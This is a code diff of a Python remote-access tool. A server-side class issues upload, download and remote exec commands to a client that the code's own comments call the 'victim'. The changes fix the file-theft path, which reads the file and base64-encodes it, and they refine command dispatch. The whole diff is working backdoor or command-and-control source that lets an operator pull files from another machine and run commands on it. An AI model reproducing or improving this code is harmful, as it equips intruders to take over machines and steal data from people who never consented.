@@ -38,9 +38,6 @@ class ClientMain:
 		# Get the command's function
 		cmdFunction = getattr(self, cmd[0])
 
-		# Notify victim of cmd to be executed
-		self.handler.send_msg(cmd[0])
-
 		# Run the command
 		return cmdFunction(cmd)
 
@@ -78,10 +75,9 @@ class ClientMain:
 		try:
 
 			# Create file stream for reading
-			data = open(file, 'rb').read()
-
+			data = open(filename, 'rb').read()
 			# Encode data
-			data = base64.b64encode(data.encode('ascii'))
+			data = base64.b64encode(data)
 
 			# Send data to client
 			self.handler.send_msg(data)
@@ -107,12 +103,24 @@ class ServerMain:
 		self.handler = handler
 		self.conn = handler.conn
 		self.cmdModules = ["upload", "download", "exec", "goodbye", "help"]
+		self.buildIns = ["goodbye", "help"]
 		self.cmdModuleHelp = {
 			"upload": "Usage: upload [LFILE] [RFILE]",
 			"download": "Usage: download [RFILE] [LFILE]",
 			"exec": "Usage: exec [REMOTE SYSTEM COMMAND]",
 			"goodbye": "Usage: Close connection"
 		}
+
+	def registerCMDHelp(self, cmd:str, usage:str):
+		if cmd in self.cmdModules:
+			if cmd not in self.cmdModuleHelp.keys():
+				self.cmdModuleHelp[cmd] = usage
+
+	def registerCMDBuiltIns(self, buildIns:list):
+		for buildIn in buildIns:
+			if buildIn not in self.buildIns:
+				self.registerCMDModules([buildIn])
+				self.buildIns.append(buildIn)
 
 	def registerCMDModules(self, modules:list):
 		for module in modules:
@@ -123,14 +131,14 @@ class ServerMain:
 
 		# If module does not exist execute it on the current system
 		if cmd[0] not in self.cmdModules:
-			os.system(cmd[0])
+			os.system(" ".join(cmd))
 			return
 
 		# Get the command's function
 		cmdFunction = getattr(self, cmd[0])
 
-		# If its not a server only
-		if cmd[0] not in ["help", "goodbye"]:
+		# If its not a build-in function
+		if cmd[0] not in self.buildIns:
 
 			# Notify victim of cmd to be executed
 			self.handler.send_msg(cmd[0])
@@ -141,7 +149,7 @@ class ServerMain:
 	def upload(self, argv):
 
 		if len(argv) < 3:
-			return b'INVALID_ARGUMENT'
+			return 'INVALID_ARGUMENT'
 
 		LFILE = argv[1] # Local file
 
@@ -164,7 +172,7 @@ class ServerMain:
 	def download(self, argv):
 
 		if len(argv) < 3:
-			return b'INVALID_ARGUMENT'
+			return 'INVALID_ARGUMENT'
 
 		RFILE = argv[1] # Remote file
 
@@ -174,9 +182,9 @@ class ServerMain:
 		self.handler.send_msg(RFILE)
 
 		# Receive file data
-		DATA = self.handler.recv_msg() 
+		DATA = self.handler.recv_msg()
 
-		# Decode data with base64
+		# Decode file data
 		DATA = base64.b64decode(DATA)
 
 		# Write data to file
@@ -188,14 +196,15 @@ class ServerMain:
 	def exec(self, argv):
 
 		if len(argv) < 2:
-			return b'INVALID_ARGUMENT'
+			return 'INVALID_ARGUMENT'
 
 		command = argv[1]
 
 		# Run command
 		self.handler.send_msg(command)
-		
+
 		return self.handler.recv_msg()
+		
 
 	def goodbye(self, argv):
 		self.conn.close()
